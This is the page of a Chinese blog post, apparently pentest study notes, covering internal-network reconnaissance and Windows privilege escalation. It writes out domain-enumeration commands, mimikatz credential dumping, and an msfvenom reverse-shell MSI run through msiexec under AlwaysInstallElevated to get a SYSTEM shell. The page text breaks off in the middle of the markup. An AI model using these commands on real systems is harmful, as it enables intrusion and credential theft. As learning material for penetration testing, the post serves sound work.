

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="CNAQ">
  <meta name="keywords" content="">
  
    <meta name="description" content="上篇“内网渗透总结”介绍内网渗透的基础知识、基本流程；本篇将会从以下角度去详细记录笔者内网渗透的思路以及学习过程： 1“信息收集、提权、横向移动、维持权限、清理痕迹”  本篇将会持续补充。 一、信息收集信息收集这块主要是为了摸清内网环境、找内网资产、识别弱点、铺路后续攻击。 内网信息收集的命令，在“内网渗透总结”中已有详细介绍：以下只记录我们应该收集哪些东西 https:&#x2F;&#x2F;aqiao-jashe">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透总结2--补充">
<meta property="og:url" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/index.html">
<meta property="og:site_name" content="一只鲶鱼">
<meta property="og:description" content="上篇“内网渗透总结”介绍内网渗透的基础知识、基本流程；本篇将会从以下角度去详细记录笔者内网渗透的思路以及学习过程： 1“信息收集、提权、横向移动、维持权限、清理痕迹”  本篇将会持续补充。 一、信息收集信息收集这块主要是为了摸清内网环境、找内网资产、识别弱点、铺路后续攻击。 内网信息收集的命令，在“内网渗透总结”中已有详细介绍：以下只记录我们应该收集哪些东西 https:&#x2F;&#x2F;aqiao-jashe">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/1.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/2.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/3.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/4.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/5.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/6.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/7.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/8.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/9.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/10.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/11.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/12.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/13.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/14.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/15.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/16.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/17.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/18.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/19.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/20.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/21.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/22.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/23.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/24.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/25.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/26.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/27.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux1.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux2.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux3.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux4.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux5.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux6.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux7.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux9.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux8.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux10.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux11.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux12.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux13.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux14.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux15.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux16.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux17.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux18.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux19.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux20.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux21.png">
<meta property="article:published_time" content="2025-07-04T08:45:05.000Z">
<meta property="article:modified_time" content="2025-07-04T08:49:25.411Z">
<meta property="article:author" content="CNAQ">
<meta property="article:tag" content="内网渗透">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/1.png">
  
  
  
  <title>内网渗透总结2--补充 - 一只鲶鱼</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"aqiao-jashell.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"uOGt77jvpFaYohTodQumjdZC-gzGzoHsz","app_key":"31Yh2ERJg2UAciRs4CWKtJTr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>一只鲶鱼</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="内网渗透总结2--补充"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-07-04 16:45" pubdate>
          2025年7月4日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          11k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          89 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">内网渗透总结2--补充</h1>
            
            
              <div class="markdown-body">
                
                <p>上篇“内网渗透总结”介绍内网渗透的基础知识、基本流程；本篇将会从以下角度去详细记录笔者内网渗透的思路以及学习过程：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">“信息收集、提权、横向移动、维持权限、清理痕迹”<br></code></pre></td></tr></table></figure>

<p>本篇将会持续补充。</p>
<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><p>信息收集这块主要是为了<strong>摸清内网环境、找内网资产、识别弱点、铺路后续攻击</strong>。</p>
<p>内网信息收集的命令，在“内网渗透总结”中已有详细介绍：以下只记录我们应该收集哪些东西</p>
<p><a href="https://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">https://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86</a></p>
<h4 id="内网信息收集目标清单："><a href="#内网信息收集目标清单：" class="headerlink" title="内网信息收集目标清单："></a>内网信息收集目标清单：</h4><h5 id="1、目标网络拓扑"><a href="#1、目标网络拓扑" class="headerlink" title="1、目标网络拓扑"></a>1、目标网络拓扑</h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino">可达的网段、子网、VLAN：通过 arp -a、route print、Nmap 等发现<br><br>网关、路由器、出口<br><br>内外网的边界<br></code></pre></td></tr></table></figure>

<h5 id="2、域环境-工作组信息"><a href="#2、域环境-工作组信息" class="headerlink" title="2、域环境&#x2F;工作组信息"></a>2、域环境&#x2F;工作组信息</h5><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">是否是 AD 域<br>当前域名 / 域控制器（DC）<br>	nltest /dclist:<span class="hljs-tag">&lt;domain&gt;</span> / echo %USERDOMAIN%<br><br>域信任关系<br>	父/子域、林、跨域信任<br><br>域用户、域组<br>	域管理员、特殊权限账户<br>	net <span class="hljs-keyword">group</span> <span class="hljs-title">/domain</span>、net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span><br></code></pre></td></tr></table></figure>

<h5 id="3、关键资产识别"><a href="#3、关键资产识别" class="headerlink" title="3、关键资产识别"></a>3、关键资产识别</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">文件服务器、数据库服务器<br><br>邮件服务器、打印机<br><br>Web 业务系统<br><br>有高权限/敏感数据的主机<br></code></pre></td></tr></table></figure>

<h5 id="4、用户-凭据收集"><a href="#4、用户-凭据收集" class="headerlink" title="4、用户&amp;凭据收集"></a>4、用户&amp;凭据收集</h5><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">当前用户、已知用户<br>	whoami、query <span class="hljs-keyword">user</span><br><br><span class="hljs-title">登录历史、登录会话</span><br><span class="hljs-title">	quser</span>、qwinsta<br><br>共享目录/文件（看看有没有留明文密码、密钥）<br>	net share、扫描 \\<span class="hljs-tag">&lt;host&gt;</span>\C$<br><br>已存的明文/哈希密码<br>	mimikatz、creds 文件、注册表<br></code></pre></td></tr></table></figure>

<h5 id="5、服务-协议"><a href="#5、服务-协议" class="headerlink" title="5、服务&amp;协议"></a>5、服务&amp;协议</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">内部开放的端口、服务<br><span class="hljs-code">	SMB、RDP、LDAP、Kerberos、RPC</span><br><span class="hljs-code"></span><br>哪些机器上运行着易利用的服务<br><span class="hljs-code">	比如 IIS、Tomcat、SQLServer</span><br><span class="hljs-code"></span><br>是否允许匿名访问的服务<br><span class="hljs-code">	SMB 匿名共享、LDAP 匿名</span><br></code></pre></td></tr></table></figure>

<h5 id="6、安全策略"><a href="#6、安全策略" class="headerlink" title="6、安全策略"></a>6、安全策略</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">域策略 / 组策略（GPO）<br><span class="hljs-code">	密码策略（复杂度、最短长度）</span><br><span class="hljs-code"></span><br><span class="hljs-code">	用户锁定策略</span><br><span class="hljs-code"></span><br><span class="hljs-code">	登录时间、权限分配</span><br></code></pre></td></tr></table></figure>

<p>7、检测易被滥用的配置</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">本地/域管理员是谁<br><br>本地防火墙策略<br><br>开放共享<span class="hljs-string">/Everyone</span>权限<br><br>异常SUID、计划任务<br></code></pre></td></tr></table></figure>

<h2 id="二、提权"><a href="#二、提权" class="headerlink" title="二、提权"></a>二、提权</h2><p>权限提升这块上文还只是去写了一种，这篇笔者将会持续优化，记录提权清单，过程以及思路</p>
<h3 id="Windows-实战笔记："><a href="#Windows-实战笔记：" class="headerlink" title="Windows 实战笔记："></a>Windows 实战笔记：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell：<br><span class="hljs-built_in">whoami</span> /all                     <span class="hljs-comment"># 查看权限</span><br>systeminfo                      <span class="hljs-comment"># 补丁+版本信息，判断能不能打 MS 漏洞</span><br>reg query &lt;路径&gt;               <span class="hljs-comment"># AlwaysInstallElevated 判断提权</span><br>sc qc &lt;服务名&gt;                 <span class="hljs-comment"># 判断是否为可控服务</span><br>UAC Bypass（无需密码提权）<br>mimikatz &gt; sekurlsa::logonpasswords  <span class="hljs-comment"># 获取明文密码</span><br><br>2025新：SMB提权：https://mp.weixin.qq.com/s/IX-1OKN5zBd9Ny77BYxMBQ<br></code></pre></td></tr></table></figure>

<p>🔥 尝试提权点：</p>
<ul>
<li>服务路径劫持（空格无引号）</li>
<li>MSI 安装提权（AlwaysInstallElevated）</li>
<li>SeImpersonate + Juicy&#x2F;PrintSpoofer</li>
<li>Scheduled Task 任意写路径</li>
</ul>
<h4 id="reg-query-AlwaysInstallElevated-判断提权-详细介绍："><a href="#reg-query-AlwaysInstallElevated-判断提权-详细介绍：" class="headerlink" title="reg query &lt;路径&gt;               # AlwaysInstallElevated 判断提权 详细介绍："></a>reg query &lt;路径&gt;               # AlwaysInstallElevated 判断提权 详细介绍：</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">reg query &lt;路径&gt; —— 判断是否存在 AlwaysInstallElevated 提权点，<br>Windows 支持通过 .msi 安装包安装程序。<br>正常情况下，只有管理员用户能以高权限安装 .msi。<br><span class="hljs-section">但如果 系统设置了 &quot;AlwaysInstallElevated&quot; 为 1，任何用户都可以以 SYSTEM 权限运行安装包，造成严重提权漏洞。</span><br><span class="hljs-section">--</span><br>检查方法：<br>使用以下两个命令：<br>reg query HKCU\Software\Policies\Microsoft\Windows\Installer<br>reg query HKLM\Software\Policies\Microsoft\Windows\Installer<br><br>如果两个注册表中都存在并且：<br>AlwaysInstallElevated    REG_DWORD    0x1<br><br>就表示当前系统可以利用该提权漏洞。<br></code></pre></td></tr></table></figure>

<h4 id="利用方法（实战）"><a href="#利用方法（实战）" class="headerlink" title="利用方法（实战）"></a>利用方法（实战）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">生成一个高权限的 .msi 安装包：<br>msfvenom -p windows/x64/shell_reverse_tcp LHOST=你的IP LPORT=端口 -f msi &gt; rev.msi<br><br>在目标机执行：<br>msiexec /quiet /qn /i rev.msi<br>得到一个反弹的 SYSTEM shell<br></code></pre></td></tr></table></figure>

<h4 id="sc-qc-——-检查服务是否存在“提权机会”"><a href="#sc-qc-——-检查服务是否存在“提权机会”" class="headerlink" title="sc qc &lt;服务名&gt; —— 检查服务是否存在“提权机会”"></a><code>sc qc &lt;服务名&gt;</code> —— 检查服务是否存在“提权机会”</h4><h4 id="详细介绍："><a href="#详细介绍：" class="headerlink" title="详细介绍："></a>详细介绍：</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coq">知识：服务提权（Unquoted Service <span class="hljs-keyword">Path</span> / 可写服务）<br>Windows 服务可能：<br>路径未加引号且路径中有空格<br>或者 服务二进制、目录权限可写<br>攻击者可以放一个恶意的 exe 来劫持服务。<br></code></pre></td></tr></table></figure>

<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 